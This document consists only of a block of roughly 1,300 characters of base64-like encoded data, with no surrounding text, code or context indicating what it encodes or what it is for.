h0vBS3mqwqZNfB2KooE87iNgbP8JQVT/AH2byS/CnjkI0JIoDeZdArvJnux6IuI0cjHkDxI0sVYbdmNvS6yIxGxc2ilnOF6lGO1/rpr4PfQNdllGXaO1wzhX3CiqMLXff+/qUSWUNJ7P3prt20+5K2DwPaZXbk7a9BLD3nc8qK7q3ODShfn57rPPqJxU8d37zmRZH7LRAEVOGVvsiA9K39arJINV9PmYM5c8e7OybhXCrsKWQhaAuZI1HwjHjYZ90OIEGcA4TMbHxLqV+LHxC13MEpbPa5Xndfa1ca1qCz6H1hywcuI3Ei2qSAcdXesNzJPF4QgVjrlbTDL+K9ci4Ho8Fl+F09gn2cKQhqsls4wei3rlExViXqYDRbC4o83D8hjT8i60xEEWAzcc+rf4Cw2xem+xb1Pu+szVpN4P5NN7dAYiuDwoGjp8H8OeruGgX07NkXnlhoe2OUTbSJ/GjvmF0e7JHR4sod+dHrgQ10GqbogVrEzOw6JmEVwyomIQiOa6ZSt7zWuu5VJuWo7uVq5itaLbtlpnICEH2bGbiqr6JNJe/e3YAvT+tdgEpmpjg3MgtGehMFjnsLD562DBs8wSoa18RNuRtSRMX/5D0MJqveShtOMTQWoItVHlSp3oxJqPyXghpJ8igowAcLGbfbw2uTj1ds40amY40hRvejxHIr9YGE9TWpF+z740Z03oyOm2k58xU0zXXCfivaA9RkR+HNBNll7MQVT0flzRceZo6iBzYbqy4ctMG08jk8g9+ejFHQCW5iMF9ESk1DNmvI3itLTA3pXU3qG5Z/npNK/thJE0eOM+Pj2HF1orFuL6k6dyuIKRgcvH03HHzooJ7h3wm0KY+MDhwbsArImrQd4nGniCVxdmjNKwfddLuMWNaqNRP3p6ZjbD/h8myQWFyCWHXL79Upbrc9TN+12b4I7yqncfffbjEnAbFaH/Dh6w5+Mrz4m27TCm18u3W20g2gisMoaqHXwE89RPesIhOsSflWa5l2BNOHU43QzvCwZ9yXB+VAfHMfXIc6QHV/vhvXZXhYt7v9NIpbbFpXAPLW6D1YVMG/7mKo0K7Iws/Uhiu/Vm16BcIP2Gp8mKmUrzvNpdK0AmfLU0i102TA43ez/DsKrfMD3N3cnPTzkfxdbGXK3naV0/8brW4XYgMW0gUOHSyULA9sggHG5RRPghqeeiHJPp4xfuM942P/rChWG9jqwqg/klFF0T1EAwevh9okr5ZqAK23H/2G692vYdSLT7QKCYyPYsgzcdzt620TjeU9RkwFQiB7KvPOQQ4k9pVJt3NQKnw==